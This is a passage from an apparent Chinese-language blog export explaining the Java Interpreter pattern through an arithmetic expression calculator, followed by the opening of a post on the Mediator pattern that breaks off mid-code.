src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8B%E5%8D%883.31.56.png\"></p>\n<p>设计四则运算：<br>1、中缀表达式转后缀表达式<br>1.1、从左到右遍历中缀表达式的每一个数字和运算符<br>1.2、如果数字就输出（即存入后缀表达式）<br>1.3、如果是右括号，则弹出左括号之前的运算符<br>1.4、如果优先级低于栈顶运算符，则弹出栈顶运算符，并将当前运算符进栈。<br>1.5、遍历结束后，将栈则剩余运算符弹出。<br>2、后缀表达式计算<br>2.1、从左到右遍历后缀表达式，遇到数字就进栈，遇到符号，就将栈顶的两个数字出栈运算，运算结果进栈，直到获得最终结果。</p>\n<p>UML类图如下：<br><img src=\"/images/old/20171027%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-27%E4%B8%8B%E5%8D%886.09.30.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 表达式抽象类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractExpression</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"type\">int</span> <span class=\"title function_\">interpret</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 数字表达式</span></span><br><span class=\"line\"><span class=\"comment\"> * 终结符表达式</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">NumberExpression</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractExpression</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"type\">int</span> num;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">NumberExpression</span><span class=\"params\">(<span class=\"type\">int</span> num)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.num = num;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">NumberExpression</span><span class=\"params\">(String num)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.num = Integer.valueOf(num);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">interpret</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> num;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象运算符表达式</span></span><br><span class=\"line\"><span class=\"comment\"> * 非终结符表达式</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractOperatorExpression</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractExpression</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 每个运算符都有左右两个参数进行运算，因此抽象到父类中</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> AbstractExpression left;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> AbstractExpression right;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">AbstractOperatorExpression</span><span class=\"params\">(AbstractExpression left, AbstractExpression right)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.left = left;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.right = right;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 加法运算符</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">AddExpression</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractOperatorExpression</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">AddExpression</span><span class=\"params\">(AbstractExpression left, AbstractExpression right)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(left, right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">interpret</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> left.interpret() + right.interpret();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 减法运算符表达式</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MinusExpression</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractOperatorExpression</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MinusExpression</span><span class=\"params\">(AbstractExpression left, AbstractExpression right)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(left, right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">interpret</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> left.interpret() - right.interpret();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 乘法运算符</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">MultiplyExpression</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractOperatorExpression</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MultiplyExpression</span><span class=\"params\">(AbstractExpression left, AbstractExpression right)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(left, right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">interpret</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> left.interpret() * right.interpret();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 除法运算符</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">DivideExpression</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractOperatorExpression</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">DivideExpression</span><span class=\"params\">(AbstractExpression left, AbstractExpression right)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(left, right);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">interpret</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> left.interpret() / right.interpret();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 存储全局变量</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">Context</span> &#123;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Map&lt;String, Integer&gt; priority = <span class=\"keyword\">new</span> <span class=\"title class_\">HashMap</span>&lt;&gt;(<span class=\"number\">8</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> Set&lt;String&gt; operator = <span class=\"keyword\">new</span> <span class=\"title class_\">HashSet</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">static</span> &#123;</span><br><span class=\"line\">        operator.add(<span class=\"string\">&quot;+&quot;</span>);</span><br><span class=\"line\">        operator.add(<span class=\"string\">&quot;-&quot;</span>);</span><br><span class=\"line\">        operator.add(<span class=\"string\">&quot;*&quot;</span>);</span><br><span class=\"line\">        operator.add(<span class=\"string\">&quot;/&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//运用运算符ASCII码-40做索引的运算符优先级</span></span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;(&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;)&quot;</span>, <span class=\"number\">3</span>);</span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;*&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;+&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;,&quot;</span>, -<span class=\"number\">1</span>);</span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;-&quot;</span>, <span class=\"number\">1</span>);</span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;.&quot;</span>, <span class=\"number\">0</span>);</span><br><span class=\"line\">        priority.put(<span class=\"string\">&quot;/&quot;</span>, <span class=\"number\">2</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> AbstractExpression expression;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 解析</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> value</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">analyse</span><span class=\"params\">(String value)</span> &#123;</span><br><span class=\"line\">        Stack&lt;AbstractExpression&gt; stack = <span class=\"keyword\">new</span> <span class=\"title class_\">Stack</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">suffix</span> <span class=\"operator\">=</span> inffixToSuffix(value);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (String str : suffix.split(<span class=\"string\">&quot; &quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"comment\">//运算符入栈</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!priority.containsKey(str))&#123;</span><br><span class=\"line\">                <span class=\"type\">AbstractExpression</span> <span class=\"variable\">expression</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NumberExpression</span>(str);</span><br><span class=\"line\">                stack.push(expression);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">                <span class=\"type\">AbstractExpression</span> <span class=\"variable\">rightExpression</span> <span class=\"operator\">=</span> stack.pop();</span><br><span class=\"line\">                <span class=\"type\">AbstractExpression</span> <span class=\"variable\">leftExpression</span> <span class=\"operator\">=</span> stack.pop();</span><br><span class=\"line\"></span><br><span class=\"line\">                AbstractOperatorExpression abstractExpression;</span><br><span class=\"line\">                <span class=\"keyword\">switch</span> (str)&#123;</span><br><span class=\"line\">                    <span class=\"keyword\">case</span> <span class=\"string\">&quot;+&quot;</span>:</span><br><span class=\"line\">                        abstractExpression = <span class=\"keyword\">new</span> <span class=\"title class_\">AddExpression</span>(leftExpression, rightExpression);</span><br><span class=\"line\">                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">case</span> <span class=\"string\">&quot;-&quot;</span>:</span><br><span class=\"line\">                        abstractExpression = <span class=\"keyword\">new</span> <span class=\"title class_\">MinusExpression</span>(leftExpression, rightExpression);</span><br><span class=\"line\">                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">case</span> <span class=\"string\">&quot;*&quot;</span>:</span><br><span class=\"line\">                        abstractExpression = <span class=\"keyword\">new</span> <span class=\"title class_\">MultiplyExpression</span>(leftExpression, rightExpression);</span><br><span class=\"line\">                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">case</span> <span class=\"string\">&quot;/&quot;</span>:</span><br><span class=\"line\">                        abstractExpression = <span class=\"keyword\">new</span> <span class=\"title class_\">DivideExpression</span>(leftExpression, rightExpression);</span><br><span class=\"line\">                        <span class=\"keyword\">break</span>;</span><br><span class=\"line\">                    <span class=\"keyword\">default</span>:</span><br><span class=\"line\">                        <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RuntimeException</span>(<span class=\"string\">&quot;参数异常&quot;</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"type\">int</span> <span class=\"variable\">num</span> <span class=\"operator\">=</span> abstractExpression.interpret();</span><br><span class=\"line\">                <span class=\"type\">NumberExpression</span> <span class=\"variable\">numberExpression</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NumberExpression</span>(num);</span><br><span class=\"line\">                stack.push(numberExpression);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        expression = stack.pop();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//计算结果</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">int</span> <span class=\"title function_\">calculate</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> expression.interpret();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 将中缀表达式转换成后缀表达式</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> expressionStr</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">inffixToSuffix</span><span class=\"params\">(String expressionStr)</span> &#123;</span><br><span class=\"line\">        Stack&lt;String&gt; stack = <span class=\"keyword\">new</span> <span class=\"title class_\">Stack</span>&lt;&gt;();</span><br><span class=\"line\">        <span class=\"comment\">//放入最小优先级的符号</span></span><br><span class=\"line\">        stack.push(<span class=\"string\">&quot;,&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">StringBuilder</span> <span class=\"variable\">inffix</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>(expressionStr.replaceAll(<span class=\"string\">&quot; &quot;</span>, <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">        <span class=\"type\">StringBuilder</span> <span class=\"variable\">suffix</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">        String element;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (inffix.length() &gt; <span class=\"number\">0</span>) &#123;</span><br><span class=\"line\">            element = nextEle(inffix);</span><br><span class=\"line\">            <span class=\"comment\">//判断是否是运算符</span></span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!priority.containsKey(element)) &#123;</span><br><span class=\"line\">                suffix.append(element).append(<span class=\"string\">&quot; &quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"string\">&quot;)&quot;</span>.equals(element)) &#123;<span class=\"comment\">//如果是反括号，则从栈中弹出数据直到弹出值为正括号</span></span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">tmp</span> <span class=\"operator\">=</span> stack.pop();</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (!<span class=\"string\">&quot;(&quot;</span>.equals(tmp))&#123;</span><br><span class=\"line\">                    suffix.append(tmp).append(<span class=\"string\">&quot; &quot;</span>);</span><br><span class=\"line\">                    tmp = stack.pop();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (<span class=\"string\">&quot;(&quot;</span>.equals(element)</span><br><span class=\"line\">                    || priority.get(element) &gt; priority.get(stack.peek())) &#123;<span class=\"comment\">//如果是正括号或者当前符号优先级大于等于栈顶的优先级，那么放入栈中</span></span><br><span class=\"line\">                stack.push(element);</span><br><span class=\"line\">            &#125; <span class=\"keyword\">else</span> &#123;<span class=\"comment\">//当前优先级小于栈顶优先级，取出栈顶</span></span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">tmp</span> <span class=\"operator\">=</span> stack.peek();</span><br><span class=\"line\">                <span class=\"keyword\">while</span> (priority.get(element) &lt;= priority.get(tmp))&#123;</span><br><span class=\"line\">                    tmp = stack.pop();</span><br><span class=\"line\">                    suffix.append(tmp).append(<span class=\"string\">&quot; &quot;</span>);</span><br><span class=\"line\">                    tmp = stack.peek();</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                stack.push(element);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (stack.size() &gt; <span class=\"number\">0</span> &amp;&amp; !<span class=\"string\">&quot;,&quot;</span>.equals(stack.peek()))&#123;</span><br><span class=\"line\">            suffix.append(stack.pop()).append(<span class=\"string\">&quot; &quot;</span>);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> suffix.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 获取下一个节点</span></span><br><span class=\"line\"><span class=\"comment\">     *</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> expressionStr</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@return</span></span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> String <span class=\"title function_\">nextEle</span><span class=\"params\">(StringBuilder expressionStr)</span> &#123;</span><br><span class=\"line\">        <span class=\"type\">StringBuilder</span> <span class=\"variable\">nextStr</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">StringBuilder</span>();</span><br><span class=\"line\">        <span class=\"type\">char</span> <span class=\"variable\">c</span> <span class=\"operator\">=</span> expressionStr.charAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">        expressionStr.deleteCharAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">        nextStr.append(c);</span><br><span class=\"line\">        <span class=\"keyword\">while</span> (isNum(c) &amp;&amp; expressionStr.length() &gt; <span class=\"number\">0</span> &amp;&amp; isNum(c = expressionStr.charAt(<span class=\"number\">0</span>))) &#123;</span><br><span class=\"line\">            expressionStr.deleteCharAt(<span class=\"number\">0</span>);</span><br><span class=\"line\">            nextStr.append(c);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> nextStr.toString();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">static</span> <span class=\"type\">boolean</span> <span class=\"title function_\">isNum</span><span class=\"params\">(<span class=\"type\">char</span> c)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> (c &gt;= <span class=\"string\">&#x27;0&#x27;</span> &amp;&amp; c &lt;= <span class=\"string\">&#x27;9&#x27;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">Main</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> InterruptedException, ScriptException &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">str</span> <span class=\"operator\">=</span> <span class=\"string\">&quot;8 + (9-1)*8/2+8*2&quot;</span>;</span><br><span class=\"line\">        <span class=\"type\">Context</span> <span class=\"variable\">context</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Context</span>();</span><br><span class=\"line\">        context.analyse(str);</span><br><span class=\"line\">        System.out.println(context.calculate());</span><br><span class=\"line\">        <span class=\"comment\">//采用引擎执行脚本</span></span><br><span class=\"line\">        <span class=\"type\">ScriptEngineManager</span> <span class=\"variable\">scriptEngineManager</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ScriptEngineManager</span>();</span><br><span class=\"line\">        <span class=\"type\">ScriptEngine</span> <span class=\"variable\">nashorn</span> <span class=\"operator\">=</span> scriptEngineManager.getEngineByName(<span class=\"string\">&quot;nashorn&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">Object</span> <span class=\"variable\">jsReturn</span> <span class=\"operator\">=</span> nashorn.eval(str);</span><br><span class=\"line\">        System.out.println(jsReturn);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ul>\n<li>参考：<span class=\"exturl\" data-url=\"aHR0cDovL2Jsb2cuY3Nkbi5uZXQva2luZ2xlYXJuamF2YS9hcnRpY2xlL2RldGFpbHMvNDg3ODY4Mjk=\">http://blog.csdn.net/kinglearnjava/article/details/48786829<i class=\"fa fa-external-link-alt\"></i></span></li>\n</ul>\n<h3 id=\"解释器模式总结\"><a href=\"#解释器模式总结\" class=\"headerlink\" title=\"解释器模式总结\"></a>解释器模式总结</h3><p>在平常使用java.util.Pattern、java.text.Format等都是采用了解释器设计模式。</p>\n<p>解释器模式为自定义语言的设计和实现提供了一种解决方案，它用于定义一组文法规则并通过这组文法规则来解释语言中的句子。虽然解释器模式的使用频率不是特别高，但是它在正则表达式、XML文档解释等领域还是得到了广泛使用。与解释器模式类似，目前还诞生了很多基于抽象语法树的源代码处理工具，例如Eclipse中的Eclipse AST，它可以用于表示Java语言的语法结构，用户可以通过扩展其功能，创建自己的文法规则。</p>\n<p>在实际项目中，非特殊情况下可以不适用解释器模式，采用脚本语言如JS、Python等。</p>\n<p><strong>应用场景：</strong></p>\n<ul>\n<li>需要解释执行的语言中的句子表示为一个抽象语法树。</li>\n<li>一些重复出现的问题可以用一种简单的语言来进行表达。</li>\n<li>执行效率不是关键问题。【注：高效的解释器通常不是通过直接解释抽象语法树来实现的，而是需要将它们转换成其他形式，使用解释器模式的执行效率并不高。】</li>\n</ul>\n<p><strong>优点：</strong></p>\n<ul>\n<li>易于改变和扩展文法。由于在解释器模式中使用类来表示语言的文法规则，因此可以通过继承等机制来改变或扩展文法。</li>\n<li>每一条文法规则都可以表示为一个类，因此可以方便地实现一个简单的语言。</li>\n<li>实现文法较为容易。在抽象语法树中每一个表达式节点类的实现方式都是相似的，这些类的代码编写都不会特别复杂，还可以通过一些工具自动生成节点类代码。</li>\n</ul>\n<p><strong>缺点：</strong></p>\n<ul>\n<li>对于复杂文法难以维护。在解释器模式中，每一条规则至少需要定义一个类，因此如果一个语言包含太多文法规则，类的个数将会急剧增加，导致系统难以管理和维护，此时可以考虑使用语法分析程序等方式来取代解释器模式。</li>\n<li>执行效率较低。由于在解释器模式中使用了大量的循环和递归调用，因此在解释较为复杂的句子时其速度很慢，而且代码的调试过程也比较麻烦。</li>\n</ul>\n","categories":["设计模式"],"tags":["设计模式","解释器模式","Interpreter Pattern"]},{"title":"Java设计模式-中介者模式（Mediator Pattern）","url":"/2017/10/30/Java%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F-%E4%B8%AD%E4%BB%8B%E8%80%85%E6%A8%A1%E5%BC%8F%EF%BC%88Mediator-Pattern%EF%BC%89/","content":"<h3 id=\"中介者模式\"><a href=\"#中介者模式\" class=\"headerlink\" title=\"中介者模式\"></a>中介者模式</h3><blockquote>\n<p>用一个中介对象（中介者）来封装一系列的对象交互，中介者使各对象不需要显式地相互引用，从而使其耦合松散，而且可以独立地改变它们之间的交互。中介者模式又称为调停者模式，它是一种对象行为型模式。</p>\n</blockquote>\n<p>如果在一个系统中对象之间的联系呈现为网状结构，对象之间存在大量的多对多联系，将导致系统非常复杂，这些对象既会影响别的对象，也会被别的对象所影响，这些对象称为同事对象，它们之间通过彼此的相互作用实现系统的行为。在网状结构中，几乎每个对象都需要与其他对象发生相互作用，而这种相互作用表现为一个对象与另外一个对象的直接耦合，这将导致一个过度耦合的系统。中介者模式可以使对象之间的关系数量急剧减少，通过引入中介者对象，可以将系统的网状结构变成以中介者为中心的星形结构，“在这个星形结构中，同事对象不再直接与另一个对象联系，它通过中介者对象与另一个对象发生相互作用。中介者对象的存在保证了对象结构上的稳定，也就是说，系统的结构不会因为新对象的引入带来大量的修改工作。如果在一个系统中对象之间存在多对多的相互关系，我们可以将对象之间的一些交互行为从各个对象中分离出来，并集中封装在一个中介者对象中，并由该中介者进行统一协调，这样对象之间多对多的复杂关系就转化为相对简单的一对多关系。通过引入中介者来简化对象之间的复杂交互，中介者模式是“迪米特法则”的一个典型应用。<span id=\"more\"></span><br>网状图：<br><img src=\"/images/old/20171030%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-30%E4%B8%8B%E5%8D%882.34.34.png\"><br>星状图：<br><img src=\"/images/old/20171030%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-30%E4%B8%8B%E5%8D%882.34.41.png\"></p>\n<p>UML类图：<br><img src=\"/images/old/20171030%E5%B1%8F%E5%B9%95%E5%BF%AB%E7%85%A72017-10-30%E4%B8%8B%E5%8D%883.00.36.png\"></p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 抽象中介者</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">abstract</span> <span class=\"keyword\">class</span> <span class=\"title class_\">AbstractMediator</span>&#123;</span><br><span class=\"line\">    <span class=\"keyword\">protected</span> List&lt;AbstractColleague&gt; colleagues = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;();</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 注册</span></span><br><span class=\"line\"><span class=\"comment\">     * <span class=\"doctag\">@param</span> colleague</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">register</span><span class=\"params\">(AbstractColleague colleague)</span>&#123;</span><br><span class=\"line\">        colleagues.add(colleague);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\">     * 相关操作</span></span><br><span class=\"line\"><span class=\"comment\">     */</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">abstract</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * 中介者实现类</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">ConcreteMediator</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">AbstractMediator</span>&#123;</span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">operation</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        System.out.println(<span class=\"string\">&quot;中介者开始通知&quot;</span>);</span><br><span class=\"line\">        colleagues.forEach(AbstractColleague::callback);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> 